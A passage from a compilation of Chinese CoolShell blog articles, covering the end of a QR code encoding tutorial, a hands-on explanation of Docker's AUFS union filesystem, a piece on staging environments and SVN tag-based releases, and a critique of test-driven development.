注：二维码的纠错码主要是通过Reed-Solomon error correction（里德- 所罗门纠错算法）来实现的。对于这个算法，对于我来说是相当的复杂，里面有很多的数学计算，比如：多项式除法，把1-255的数映射成2的n次方（0<=n<=255）的伽罗瓦域Galois Field之类的神一样的东西，以及基于这些基础的纠错数学公式，因为我的数据基础差，对于我来说太过复杂，所以我一时半会儿还有点没搞明白，还在学习中，所以，我在这里就不展开说这些东西了。还请大家见谅了。（当然，如果有朋友很明白，也繁请教教我）#### 最终编码##### 穿插放置如果你以为我们可以开始画图，你就错了。二维码的混乱技术还没有玩完，它还要把数据码和纠错码的各个codewords交替放在一起。如何交替呢，规则如下：对于数据码：把每个块的第一个codewords先拿出来按顺度排列好，然后再取第一块的第二个，如此类推。如：上述示例中的Data Codewords如下：块 1 | 67 | 85 | 70 | 134 | 87 | 38 | 85 | 194 | 119 | 50 | 6 | 18 | 6 | 103 | 38 |   ---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---   块 2 | 246 | 246 | 66 | 7 | 118 | 134 | 242 | 7 | 38 | 86 | 22 | 198 | 199 | 146 | 6 |   块 3 | 182 | 230 | 247 | 119 | 50 | 7 | 118 | 134 | 87 | 38 | 82 | 6 | 134 | 151 | 50 | 7   块 4 | 70 | 247 | 118 | 86 | 194 | 6 | 151 | 50 | 16 | 236 | 17 | 236 | 17 | 236 | 17 | 236
我们先取第一列的：67， 246， 182， 70然后再取第二列的：67， 246， 182， 70， 85，246，230 ，247如此类推：67， 246， 182， 70， 85，246，230 ，247 ……… ……… ，38，6，50，17，7，236对于纠错码，也是一样：块 1 | 213 | 199 | 11 | 45 | 115 | 247 | 241 | 223 | 229 | 248 | 154 | 117 | 154 | 111 | 86 | 161 | 111 | 39   ---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---   块 2 | 87 | 204 | 96 | 60 | 202 | 182 | 124 | 157 | 200 | 134 | 27 | 129 | 209 | 17 | 163 | 163 | 120 | 133   块 3 | 148 | 116 | 177 | 212 | 76 | 133 | 75 | 242 | 238 | 76 | 195 | 230 | 189 | 10 | 108 | 240 | 192 | 141   块 4 | 235 | 159 | 5 | 173 | 24 | 147 | 59 | 33 | 106 | 40 | 255 | 172 | 82 | 2 | 131 | 32 | 178 | 236
和数据码取的一样，得到：213，87，148，235，199，204，116，159，…… …… 39，133，141，236然后，再把这两组放在一起（纠错码放在数据码之后）得到：67, 246, 182, 70, 85, 246, 230, 247, 70, 66, 247, 118, 134, 7, 119, 86, 87, 118, 50, 194, 38, 134, 7, 6, 85, 242, 118, 151, 194, 7, 134, 50, 119, 38, 87, 16, 50, 86, 38, 236, 6, 22, 82, 17, 18, 198, 6, 236, 6, 199, 134, 17, 103, 146, 151, 236, 38, 6, 50, 17, 7, 236, 213, 87, 148, 235, 199, 204, 116, 159, 11, 96, 177, 5, 45, 60, 212, 173, 115, 202, 76, 24, 247, 182, 133, 147, 241, 124, 75, 59, 223, 157, 242, 33, 229, 200, 238, 106, 248, 134, 76, 40, 154, 27, 195, 255, 117, 129, 230, 172, 154, 209, 189, 82, 111, 17, 10, 2, 86, 163, 108, 131, 161, 163, 240, 32, 111, 120, 192, 178, 39, 133, 141, 236
这就是我们的数据区。##### Remainder Bits最后再加上Reminder Bits，对于某些Version的QR，上面的还不够长度，还要加上Remainder Bits，比如：上述的5Q版的二维码，还要加上7个bits，Remainder Bits加零就好了。关于哪些Version需要多少个Remainder bit，可以参看QR Code Spec的第15页的Table-1的定义表。#### 画二维码图##### Position Detection Pattern首先，先把Position Detection图案画在三个角上。（无论Version如何，这个图案的尺寸就是这么大）##### Alignment Pattern然后，再把Alignment图案画上（无论Version如何，这个图案的尺寸就是这么大）关于Alignment的位置，可以查看QR Code Spec的第81页的Table-E.1的定义表（下表是不完全表格）下图是根据上述表格中的Version8的一个例子（6，24，42）##### Timing Pattern接下来是Timing Pattern的线（这个不用多说了）
****#####  Format Information再接下来是Formation Information，下图中的蓝色部分。Format Information是一个15个bits的信息，每一个bit的位置如下图所示：（注意图中的Dark Module，那是永远出现的）这15个bits中包括：* 5个数据bits：其中，2个bits用于表示使用什么样的Error Correction Level， 3个bits表示使用什么样的Mask   * 10个纠错bits。主要通过BCH Code来计算然后15个bits还要与101010000010010做XOR操作。这样就保证不会因为我们选用了00的纠错级别和000的Mask，从而造成全部为白色，这会增加我们的扫描器的图像识别的困难。下面是一个示例：关于Error Correction Level如下表所示：关于Mask图案如后面的Table 23所示。##### Version Information再接下来是Version Information（版本7以后需要这个编码），下图中的蓝色部分。Version Information一共是18个bits，其中包括6个bits的版本号以及12个bits的纠错码，下面是一个示例：
而其填充位置如下：##### 数据和数据纠错码然后是填接我们的最终编码，最终编码的填充方式如下：从左下角开始沿着红线填我们的各个bits，1是黑色，0是白色。如果遇到了上面的非数据区，则绕开或跳过。##### 掩码图案这样下来，我们的图就填好了，但是，也许那些点并不均衡，如果出现大面积的空白或黑块，会告诉我们扫描识别的困难。所以，我们还要做Masking操作（靠，还嫌不复杂）QR的Spec中说了，QR有8个Mask你可以使用，如下所示：其中，各个mask的公式在各个图下面。所谓mask，说白了，就是和上面生成的图做XOR操作。Mask只会和数据区进行XOR，不会影响功能区。（ **注：选择一个合适的Mask也是有算法的** ）其Mask的标识码如下所示：（其中的i,j分别对应于上图的x,y）下面是Mask后的一些样子，我们可以看到被某些Mask XOR了的数据变得比较零散了。Mask过后的二维码就成最终的图了。好了，大家可以去尝试去写一下QR的编码程序，当然，你可以用网上找个Reed Soloman的纠错算法的库，或是看看别人的源代码是怎么实现这个繁锁的编码。（全文完）# Docker基础技术：AUFS
作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!docker-filesystems-busyboxrwAUFS是一种Union File System，所谓UnionFS就是把不同物理位置的目录合并mount到同一个目录中。UnionFS的一个最主要的应用是，把一张CD/DVD和一个硬盘目录给联合 mount在一起，然后，你就可以对这个只读的CD/DVD上的文件进行修改（当然，修改的文件存于硬盘上的目录里）。AUFS又叫Another UnionFS，后来叫Alternative UnionFS，后来可能觉得不够霸气，叫成Advance UnionFS。是个叫Junjiro Okajima（岡島順治郎）在2006年开发的，AUFS完全重写了早期的UnionFS 1.x，其主要目的是为了可靠性和性能，并且引入了一些新的功能，比如可写分支的负载均衡。AUFS在使用上全兼容UnionFS，而且比之前的UnionFS在稳定性和性能上都要好很多，后来的UnionFS 2.x开始抄AUFS中的功能。但是他居然没有进到Linux主干里，就是因为Linus不让，基本上是因为代码量比较多，而且写得烂（相对于只有3000行的union mount和10000行的UnionFS，以及其它平均下来只有6000行代码左右的VFS，AUFS居然有30000行代码），所以，岡島不断地改进代码质量，不断地提交，不断地被Linus拒掉，所以，到今天AUFS都还进不了Linux主干（今天你可以看到AUFS的代码其实还好了，比起OpenSSL好N倍，要么就是Linus对代码的质量要求非常高，要么就是Linus就是不喜欢AUFS）。
不过，好在有很多发行版都用了AUFS，比如：Ubuntu 10.04，Debian6.0, Gentoo Live CD支持AUFS，所以，也OK了。好了，扯完这些闲话，我们还是看一个示例吧（环境：Ubuntu 14.04）首先，我们建上两个目录（水果和蔬菜），并在这两个目录中放上一些文件，水果中有苹果和蕃茄，蔬菜有胡萝卜和蕃茄。$ tree     .     ├── fruits     │   ├── apple     │   └── tomato     └── vegetables     ├── carrots     └── tomato然后，我们输入以下命令：# 创建一个mount目录     $ mkdir mnt# 把水果目录和蔬菜目录union mount到 ./mnt目录中     $ sudo mount -t aufs -o dirs=./fruits:./vegetables none ./mnt#  查看./mnt目录     $ tree ./mnt     ./mnt     ├── apple     ├── carrots     └── tomato
我们可以看到在./mnt目录下有三个文件，苹果apple、胡萝卜carrots和蕃茄tomato。水果和蔬菜的目录被union到了./mnt目录下了。我们来修改一下其中的文件内容：$ echo mnt > ./mnt/apple     $ cat ./mnt/apple     mnt     $ cat ./fruits/apple     mnt上面的示例，我们可以看到./mnt/apple的内容改了，./fruits/apple的内容也改了。$ echo mnt_carrots > ./mnt/carrots     $ cat ./vegetables/carrots$ cat ./fruits/carrots     mnt_carrots上面的示例，我们可以看到，我们修改了./mnt/carrots的文件内容，./vegetables/carrots并没有变化，反而是./fruits/carrots的目录中出现了carrots文件，其内容是我们在./mnt/carrots里的内容。也就是说，我们在mount aufs命令中，我们没有指它vegetables和fruits的目录权限，默认上来说，命令行上第一个（最左边）的目录是可读可写的，后面的全都是只读的。（一般来说，最前面的目录应该是可写的，而后面的都应该是只读的）
所以，如果我们像下面这样指定权限来mount aufs，你就会发现有不一样的效果（记得先把上面./fruits/carrots的文件删除了）：$ sudo mount -t aufs -o dirs=./fruits=rw:./vegetables=rw none ./mnt$ echo "mnt_carrots" > ./mnt/carrots$ cat ./vegetables/carrots     mnt_carrots$ cat ./fruits/carrots     cat: ./fruits/carrots: No such file or directory现在，在这情况下，如果我们要修改./mnt/tomato这个文件，那么究竟是哪个文件会被改写？$ echo "mnt_tomato" > ./mnt/tomato$ cat ./fruits/tomato     mnt_tomato$ cat ./vegetables/tomato     I am a vegetable可见，如果有重复的文件名，在mount命令行上，越往前的就优先级越高。你可以用这个例子做一些各种各样的试验，我这里主要是给大家一个感性认识，就不展开试验下去了。
那么，这种UnionFS有什么用？历史上，有一个叫Knoppix的Linux发行版，其主要用于Linux演示、光盘教学、系统急救，以及商业产品的演示，不需要硬盘安装，直接把CD/DVD上的image运行在一个可写的存储设备上（比如一个U盘上），其实，也就是把CD/DVD这个文件系统和USB这个可写的系统给联合mount起来，这样你对CD/DVD上的image做的任何改动都会在被应用在U盘上，于是乎，你可以对CD/DVD上的内容进行任意的修改，因为改动都在U盘上，所以你改不坏原来的东西。我们可以再发挥一下想像力，你也可以把一个目录，比如你的源代码，作为一个只读的template，和另一个你的working directory给union在一起，然后你就可以做各种修改而不用害怕会把源代码改坏了。有点像一个ad hoc snapshot。Docker把UnionFS的想像力发挥到了容器的镜像。你是否还记得我在介绍Linux Namespace上篇中用mount namespace和chroot山寨了一镜像。现在当你看过了这个UnionFS的技术后，你是不是就明白了，你完全可以用UnionFS这样的技术做出分层的镜像来。
下图来自Docker的官方文档Layer，其很好的展示了Docker用UnionFS搭建的分层镜像。!docker-filesystems-multilayer关于docker的分层镜像，除了aufs，docker还支持btrfs, devicemapper和vfs，你可以使用 -s 或 –storage- driver= 选项来指定相关的镜像存储。在Ubuntu 14.04下，docker默认Ubuntu的 aufs（在CentOS7下，用的是devicemapper，关于devicemapper，我会以以后的文章中讲解）你可以在下面的目录中查看相关的每个层的镜像：`/var/lib/docker/aufs/diff/<id> `在docker执行起来后（比如：docker run -it ubuntu /bin/bash ），你可以从/sys/fs/aufs/si_[id]目录下查看aufs的mount的情况，下面是个示例：#ls /sys/fs/aufs/si_b71b209f85ff8e75/     br0      br2      br4      br6      brid1    brid3    brid5    xi_path     br1      br3      br5      brid0    brid2    brid4    brid6
# cat /sys/fs/aufs/si_b71b209f85ff8e75/*     /var/lib/docker/aufs/diff/87315f1367e5703f599168d1e17528a0500bd2e2df7d2fe2aaf9595f3697dbd7=rw     /var/lib/docker/aufs/diff/87315f1367e5703f599168d1e17528a0500bd2e2df7d2fe2aaf9595f3697dbd7-init=ro+wh     /var/lib/docker/aufs/diff/d0955f21bf24f5bfffd32d2d0bb669d0564701c271bc3dfc64cfc5adfdec2d07=ro+wh     /var/lib/docker/aufs/diff/9fec74352904baf5ab5237caa39a84b0af5c593dc7cc08839e2ba65193024507=ro+wh     /var/lib/docker/aufs/diff/a1a958a248181c9aa6413848cd67646e5afb9797f1a3da5995c7a636f050f537=ro+wh     /var/lib/docker/aufs/diff/f3c84ac3a0533f691c9fea4cc2ceaaf43baec22bf8d6a479e069f6d814be9b86=ro+wh     /var/lib/docker/aufs/diff/511136ea3c5a64f264b78b5433614aec563103b4d4702f3ba7d4d2698e22c158=ro+wh     64     65     66     67     68     69     70     /run/shm/aufs.xino
你会看到只有最顶上的层（branch）是rw权限，其它的都是ro+wh权限只读的。关于docker的aufs的配置，你可以在/var/lib/docker/repositories-aufs这个文件中看到。目录* AUFS的一些特性     * 相关术语     * 相关问题   * AUFS的性能   * 延伸阅读#### AUFS的一些特性AUFS有所有Union FS的特性，把多个目录，合并成同一个目录，并可以为每个需要合并的目录指定相应的权限，实时的添加、删除、修改已经被mount好的目录。而且，他还能在多个可写的branch/dir间进行负载均衡。上面的例子，我们已经看到AUFS的mount的示例了。下面我们来看一看被union的目录（分支）的相关权限：* rw表示可写可读read-write。   * ro表示read-only，如果你不指权限，那么除了第一个外ro是默认值，对于ro分支，其永远不会收到写操作，也不会收到查找whiteout的操作。   * rr表示real-read-only，与read-only不同的是，rr标记的是天生就是只读的分支，这样，AUFS可以提高性能，比如不再设置inotify来检查文件变动通知。
权限中，我们看到了一个术语：whiteout，下面我来解释一下这个术语。一般来说ro的分支都会有wh的属性，比如 “[dir]=ro+wh”。所谓whiteout的意思，如果在union中删除的某个文件，实际上是位于一个readonly的分支（目录）上，那么，在mount的union这个目录中你将看不到这个文件，但是read- only这个层上我们无法做任何的修改，所以，我们就需要对这个readonly目录里的文件作whiteout。AUFS的whiteout的实现是通过在上层的可写的目录下建立对应的whiteout隐藏文件来实现的。看个例子：假设我们有三个目录和文件如下所示（test是个空目录）：# tree     .     ├── fruits     │   ├── apple     │   └── tomato     ├── test     └── vegetables     ├── carrots     └── tomato我们如下mount：# mkdir mnt# mount -t aufs -o dirs=./test=rw:./fruits=ro:./vegetables=ro none ./mnt
# # ls ./mnt/     apple  carrots  tomato现在我们在权限为rw的test目录下建个whiteout的隐藏文件.wh.apple，你就会发现./mnt/apple这个文件就消失了:# touch ./test/.wh.apple# ls ./mnt     carrots  tomato上面这个操作和 rm ./mnt/apple是一样的。##### 相关术语 **Branch** – 就是各个要被union起来的目录（就是我在上面使用的dirs的命令行参数）* Branch根据被union的顺序形成一个stack，一般来说最上面的是可写的，下面的都是只读的。   * Branch的stack可以在被mount后进行修改，比如：修改顺序，加入新的branch，或是删除其中的branch，或是直接修改branch的权限 **Whiteout** 和 **Opaque*** 如果UnionFS中的某个目录被删除了，那么就应该不可见了，就算是在底层的branch中还有这个目录，那也应该不可见了。* Whiteout就是某个上层目录覆盖了下层的相同名字的目录。用于隐藏低层分支的文件，也用于阻止readdir进入低层分支。
* Opaque的意思就是不允许任何下层的某个目录显示出来。* 在隐藏低层档的情况下，whiteout的名字是’.wh.<filename>’。* 在阻止readdir的情况下，名字是’.wh..wh..opq’或者 ’.wh.__dir_opaque’。##### 相关问题看到上面这些，你一定会有几个问题：**其一、你可能会问，要有文件在原来的地方被修改了会怎么样？** mount的目录会一起改变吗？答案是会的，也可以是不会的。因为你可以指定一个叫udba的参数（全称：User’s Direct Branch Access），这个参数有三个取值：* **udba=none** – 设置上这个参数后，AUFS会运转的更快，因为那些不在mount目录里发生的修改，aufs不会同步过来了，所以会有数据出错的问题。   * **udba=reval** – 设置上这个参数后，AUFS会去查文件有没有被更新，如果有的话，就会把修改拉到mount目录内。   * **udba=notify** – 这个参数会让AUFS为所有的branch注册inotify，这样可以让AUFS在更新文件修改的性能更高一些。
**其二、如果有多个rw的branch（目录）被union起来了，那么，当我创建文件的时候，aufs会创建在哪里呢？** aufs提供了一个叫create的参数可以供你来配置相当的创建策略，下面有几个例子。**create=rr | round−robin** 轮询。下面的示例可以看到，新创建的文件轮流写到三个目录中hchen$ sudo mount -t aufs  -o dirs=./1=rw:./2=rw:./3=rw -o create=rr none ./mnt     hchen$ touch ./mnt/a ./mnt/b ./mnt/c     hchen$ tree     .     ├── 1     │   └── a     ├── 2     │   └── c     └── 3     └── b**create=mfs[:second] | most−free−space[:second]** 选一个可用空间最好的分支。可以指定一个检查可用磁盘空间的时间。**create=mfsrr:low[:second]** 选一个空间大于low的branch，如果空间小于low了，那么aufs会使用 round- robin 方式。
更多的关于AUFS的细节使用参数，大家可以直接在Ubuntu 14.04下通过 man aufs 来看一下其中的各种参数和命令。#### AUFS的性能AUFS的性能慢吗？也慢也不慢。因为AUFS会把所有的分支mount起来，所以，在查找文件上是比较慢了。因为它要遍历所有的branch。是个O(n)的算法（很明显，这个算法有很大的改进空间的）所以，branch越多，查找文件的性能也就越慢。但是，一旦AUFS找到了这个文件的inode，那后以后的读写和操作原文件基本上是一样的。所以，如果你的程序跑在在AUFS下，open和stat操作会有明显的性能下降，branch越多，性能越差，但是在write/read操作上，性能没有什么变化。IBM的研究中心对Docker的性能给了一份非常不错的性能报告（PDF）《An Updated Performance Comparison of Virtual Machinesand Linux Containers》我截了两张图出来，第一张是顺序读写，第二张是随机读写。基本没有什么性能损失的问题。而KVM在随机读写的情况也就有点慢了（但是，如果硬盘是SSD的呢？）
**顺序读写****随机读写**#### 延伸阅读* Introduce UnionFS   * Union file systems: Implementations, part I   * Union file systems: Implementations, part 2   * Another union filesystem approach   * Unioning file systems: Architecture, features, and design choices（全文完）# 预发布环境,Tag发布机制和可重复的部署过程作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**下面文章由网友吕毅投递，源文是：**—————————————————————————————————————————————周末聚会，无意间聊起建筑行业。自己是搞软件开发的，我们的行业从建筑设计/施工过程中借鉴了大量的概念，隐喻，名词。可以说软件就是现实中伴随整个人类历史发展的“建筑”在虚拟空间中的投影。有个两年前问过其他朋友的问题，这次友人又再次提起，“为什么建筑设计过程中没有普遍性的采用版本控制呢？” 瞎扯了一干各种原因后，我们几乎同时想到一个名字”Joel”，建筑设计行业或许缺乏像Joel Spolsky一样十数年如一日，把自己丰富的经验和深入的思考转化成一篇篇文章以向新人传授软件开发过程中那些容易被忽略的概念。高傲的黑客们会对CMMI之类的认证抱以鄙夷之情，但对Joel整理出的12条写出更好软件的”最佳实践”，大家甚至把此称为审视其他团队开发过程的“Joel TEST”以推崇
这12条测试如下:> 1\. 是否启用版本控制？ > > 2\. 是否可以一步构建? > > 3\. 是否进行每日构建？ > > 4\. 是否有bug跟踪列表？ > > 5\. 是否在修改bug后，才开始写新代码？ > > 6\. 是否及时更新工作计划？ > > 7\. 是否在开发前编写了大家一致认可的功能文档？ > > 8\. 是否有安静的工作环境？ > > 9\. 是否在使用最好的软件开发工具？ > > 10.是否有专职测试人员？ > > 11.是否在面试时以实际编写代码来检查求职者？ > > 12.是否利用陌生人进行可用性测试？你所在的团队符合其中的几条呢？ 觉得这些条目太一般，软件开发原本就该如此？ Joel Test写于十年前，一个Windows XP，Mac OS X,Ubuntu都还没有面世的年代。 如果你觉得这些条目有些过时了，Google中搜索“Joel Test”，你可以看到这十年内很多对此进行更新的尝试, 比如这两个页面“The Joel Test Update for 2010″,“Joel Test for web dev”.我的主要工作集中在”Web/Mobile Web”领域，在”Joel Test”写就的年代，Web技术仅仅是一些用记事本就能写出的Html页面。但到了今天，到了经历过BS浪潮,后端编程语言井喷涌现，Ajax和HTML5变得人人皆知的今天。Web技术已经变成了一个由N种后端技术*N种开发语言/框架*N种前端技术交织起来的复杂体系。Web 程序员们觉得Joel开出的列表仍然有价值,那是因为我们的大部分工作仍然延续着上一代程序员们开创的轨迹；我们仍然在通过程序代码释创造力同时避免BUG的出现;我们仍然得谨慎的在强大,华丽与高效之间做着权衡. 相比客户端,Web技术最大的优势在于部署成本的节省,我们的程序和Joel年代最大的区别也在于此。这一年来新的工作岗位让我学到了很多,部署过程正是其中我觉得最值得和大家分享的部分.
下面这个列表来自前阵子看到的一篇很好的文章Staging Servers, Source Control & Deploy Workflows, And Other Stuff Nobody Teaches You,标题中的列出的三项和我的体会高度吻合,下面我会对他们一一做出自己的诠释> 1.是否采用了预发布环境 > > 2.是否以Tag作为发布单位 > > 3.是否让部署过程是可重复的### 是否采用了预发布环境关于测试驱动开发的鼓吹中,”免除对代码修改的恐惧”十分具有诱惑力.我们都不喜欢功能逐渐丰富过程中冷不防出现的各种BUG,这些BUG打乱我们的计划,破坏我们的心情,从而让我们对开发新功能的旅程心存恐惧.TDD的最大魅力也来自于通过测试先行来保证后续的功能扩展相对于预期是可验证的. 不过无论你的WEB开发过程是怎样的,最终的代码和内容还是要通过发布来送达到用户浏览器中,你可以对PK需求,修改BUG,延长加班毫无畏惧,但你不能忽略用户体验.代码一旦部署到正式环境上,对你工作的评判不再是项目组中关心你,体谅你的同事.而是千万对错误零容忍的用户. 在发布前你已经做过周全的测试? 新增的每一项功能已经测试过? 很好.不过是在你的开发环境或某处偏僻的”测试环境”中? 服务器OS不一样,Web Server有差别,缓存服务未启用,APP容器或解释器,数据库版本有差别,没接通第三方API, 这所有的一切都可能会造成发布后,你自己或用户刷新网站后的那声”What The fuck?”, 我想这应该是较之修改BUG,你更不想面对的情景吧.
总的说来,”预发布环境”就等于没有真实用户访问的生产环境, 除了让用户不能访问到外,尽一切可能让这个环境和生产环境一致.每次正式发布时以这个环境为目标,测试流程完成后.把发布内容从这个环境”平移”到生产环境.### 是否以Tag作为发布单位从业几年来,”所在团队把SVN当FTP用”是几乎每次朋友们互相吐槽时都能听到的话题,”SVN的分支合并太难用;需要更密切和团队伙伴共享工作内容…”我们可以很轻松的找到不创建功能分支然后进行合并的理由,事实上这么做可能也有一定的”合理性”.但发布时打个Tag,对你的现有开发流程几乎不会带来负担.你不需要切换到Git或Mercury,唯一要做的只是在提交后,发布前运行一行svn copy命令,然后在发布目标上用svn switch命令代替svn update来更新代码.只有一点需要注意,创建Tag的svn copy命令的目标最好是一个新的SVN仓库地址(新Tag路径),而不是本地目录.这么做的理由是当以仓库路径作为svn copy目标时,不会产生文件拷贝,而以本地路径为目标执行时,会发生文件拷贝,如果项目包含很多文件,这个过程会较为漫长.如果想避免本地打tag时的文件拷贝,你可切换到分布式版本控制系统.
这么做的好处也是明显的,虽然我们已经通过预发布环境规避了大部分发布环境可能引入的问题.但当那”万一”发生时.你能够以最快的速度切换到上一次发布时的状态.通常可以通过”$svn switch [上次发布Tag的SVN路径]“一行命令搞定.### 是否让部署过程是可重复的如果你所在的团队对开发和运维工作进行了严格切分,这不会是一个问题.但不是所有项目都会到这个规模,如果你是一个幸福的能变更生产环境的Web程序员,请千万小心,你对生产环境的每次调整/优化,都可能让项目部署过程变得不可重复.随着时间的推移,你会忘记当时的配置项.一旦项目需要扩容,恢复,移交.这过程都可能演变成灾难.上面提到那篇文章中,提倡用部署脚本来管理部署过程.这是很好的解决方法,但如果你暂时缺乏系统脚本编程能力.分门别类把每次环境配置过程记录清楚吧,就当这项工作要在你不在场的情况下被别人重复执行.别人说我们是”码农”,我们要把自己当工程师.# TDD并不是看上去的那么美作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn春节前的一篇那些炒作过度的技术和概念中对敏捷和中国ThoughtWorks的微辞引发了很多争议，也惊动了中国ThoughtWorks公司给我发来了邮件想来找我当面聊聊。对于Agile的Fans们，意料之中地也对我进行了很多质疑和批评。我也回复了许多评论。不过，我的那些回复都是关于中国ThoughtWorks咨询师以及其咨询的方法的。我对Agile方法论中的具体内容评价的不是很多，所以，我想不妨讨论一下Agile方法论中的具体的实践（以前本站也讨论过结对编程的利与弊）。
那么，这次就说说TDD吧，这是ThoughtWorks中国和Agile的Fans们最喜欢的东西了。我在原来的那篇文章中，我把TDD从过度炒作的技术剔除了出去，因为我还是觉得TDD有些道理的，不过，回顾我的经验，我也并不是很喜欢TDD。我这篇文章是想告诉大家， **TDD并没有看上去的那么美，而且非常难以掌控，并且，这个方法是有悖论之处的** 。#### TDD简介TDD全称Test Driven Development，是一种软件开发的流程，其由敏捷的“极限编程”引入。其开发过程是从功能需求的test case开始，先添加一个test case，然后运行所有的test case看看有没有问题，再实现test case所要测试的功能，然后再运行test case，查看是否有case失败，然后重构代码，再重复以上步骤。其理念主要是确保两件事：* 确保所有的需求都能被照顾到。   * 在代码不断增加和重构的过程中，可以检查所有的功能是否正确。我不否认TDD的一些有用的地方，如果我们以Test Case 开始，那么，我们就可以立刻知道我们的代码运行的情况是什么样的，这样可以让我们更早地得到我们实现思路的反馈，于是我们更会有信心去重构，去重新设计，从而可以让我们的代码更为正确。
不过，我想提醒的是， **TDD和Unit Test是两码子事儿** 。有很多人可能混淆了自动化的Unit Test（如：XUnit系例）和TDD的软件开发过程。另外，可能还会有人向鼓吹“ **TDD让你进行自顶向下的设计方式** ”，对此，请参阅本站的《Richard Feynman, 挑战者号, 软件工程》——NASA的挑战者号告诉你自顶向下设计的危险性。#### TDD的困难之处下面是几个我认为TDD不容易掌控的地方，甚至就有些不可能（如果有某某TDD的Fans或是ThoughtWorks的咨询师和你鼓吹TDD，你可以问问他们下面这些问题）* **测试范围的确定** 。TDD开发流程，一般是先写Test Case。Test Case有很多种，有Functional的，有Unit的，有Integration的……，最难的是Test Case要写成什么样的程度呢。* 如果写的太过High Level，那么，当你的Test Case 失败的时候，你不知道哪里出问题了，你得要花很多精力去debug代码。而我们希望的是其能够告诉我是哪个模块出的问题。只有High Level的Test Case，岂不就是Waterfall中的Test环节?     * 如果写的太过Low Level，那么，带来的问题是，你需要花两倍的时间来维护你的代码，一份给test case，一份给实现的功能代码。     * 另外，如果写得太Low Level，根据Agile的迭代开发来说，你的需求是易变的，很多时候，我们的需求都是开发人员自己做的Assumption。所以，你把Test Case 写得越细，将来，一旦需求或Assumption发生变化，你的维护成本也是成级数增加的。     * 当然，如果我把一个功能或模块实现好了，我当然知道Test 的Scope在哪里，我也知道我的Test Case需要写成什么样的程度。但是， **TDD的悖论就在于，你在实现之前先把Test Case就写出来，所以，你怎么能保证你一开始的Test Case是适合于你后面的代码的** ？不要忘了，程序员也是在开发的过程中逐渐了解需求和系统的。如果边实现边调整Test Case，为什么不在实现完后再写Test Case呢？如果是这样的话，那就不是TDD了。
* **关注测试而不是设计** 。这可能是TDD的一个弊端，就像《十条不错的编程观点》中所说的一样——“Unit Test won’t help you write the good code”，在实际的操作过程中，我看到很多程序员为了赶工或是应付工作， **导致其写的代码是为了满足测试的，而忽略了代码质量和实际需求** 。有时候，当我们重构代码或是fix bug的时候，甚至导致程序员认为只要所有的Test Case都通过了，代码就是正确的。当然，TDD的粉丝们一定会有下面的辩解：* 可以通过结对编程来保证代码质量。     * 代码一开始就是需要满足功能正确，后面才是重构和调优，而TDD正好让你的重构和优化不会以牺牲功能为代价。说的没错，但仅在理论上。操作起来可能会并不会得到期望的结果。1）“结对编程”其并不能保证结对的两个人都不会以满足测试为目的，因为重构或是优化的过程中，一旦程序员看到N多的test cases 都failed了，人是会紧张的，你会不自然地去fix你的代码以让所有的test case都通过。2）另外，我不知道大家怎么编程，我一般的做法是从大局思考一下各种可行的实现方案，对于一些难点需要实际地去编程试试，最后权衡比较，挑选一个最好的方案去实现。而往往着急着去实现某一功能，通常在会导致的是返工，而后面的重构基本上因为前期考虑不足和成为了重写。所以，在实际操作过程中，你会发现，很多时候的重构通常意味着重写，因为那些”非功能性”的需求，你不得不re- design。而re-design往往意味着，你要重写很多Low-Level的Test Cases，搞得你只敢写High Level的Test Case。
* **TDD导致大量的Mock和Stub** 。相信我，Test Case并不一定是那么容易的。比如，和其它团队或是系统的接口的对接，或是对实现还不是很清楚的模块，等等。于是你需要在你的代码中做很多的Mock和Stub，甚至fake一些函数来做模拟，很明显，你需要作大量的 assumption。于是，你发现管理和维护这些Mock和Stub也成了一种负担，最要命的是，那不是真正的集成测试，你的Test Case中的Mock很可能是错的，你需要重写他们。也许，你会说，就算是不用TDD，在正常的开发过程中，我们的确需要使用Mock和Stub。没错！的确是这样的，不过，记住，我们是在实现代码后来决定什么地方放一个Mock或Stub，而不是在代码实现前干这个事的。* **Test Case并没有想像中的那么简单** 。和Waterfall一样，Waterfall的每一个环节都依赖于前面那个环节的正确性，如果我们没有正确的理解需求，那么对于TDD，Test Case和我们的Code都会的错的。所以，TDD中，Test Case是开发中最重要的环节，Test Case的质量的问题会直接导致软件开发的正确和效率。 **而TW的咨询师和Agile的Fans们似乎天生就认为，TDD比Waterfall更能准确地了解需求。如果真是这样，用TDD进行需求分析，后面直接Waterfall就OK了** 。
另外，某些Test Case并不一定那么好写，你可能80%的编程时间需要花在某个Test Case的设计和实现上（比如：测试并发），然后，需求一变，你又得重写Test Case。有时候，你会发现写Test Case其实和做实际设计没有差别，你同样要考虑你Test Case的正确性，扩展性，易读性，易维护性，甚至重用性。 **如果说我们开发的Test Case是用来保证我们代码实现的正确性，那么，谁又来保证我们的Test Case的正确性呢** ？编写Test Case也需要结对或是Code review吗？软件开发有点像长跑，如果把能量花在了前半程，后半程在发力就能难了。也许，TDD真是过度炒作的，不过，我还真是见过使用TDD开发的不错的项目，只不过那个项目比较简单了。更多的情况下，我看到的是教条式的生硬的TDD，所以，不奇怪地听到了程序员们的抱怨——“自从用了TDD，工作量更大了”。当然，这也不能怪他们，TDD本来就是很难把控的方法。这里送给软件开发管理者们一句话——“ **当你的软件开发出现问题的时候，就像bug-fix一样，首要的事是找到root cause，然后再case by case的解决，千万不要因为有问题就要马上换一种新的开发方法** ”。相信我，大多数的问题是人和管理者的问题，不是方法的问题。
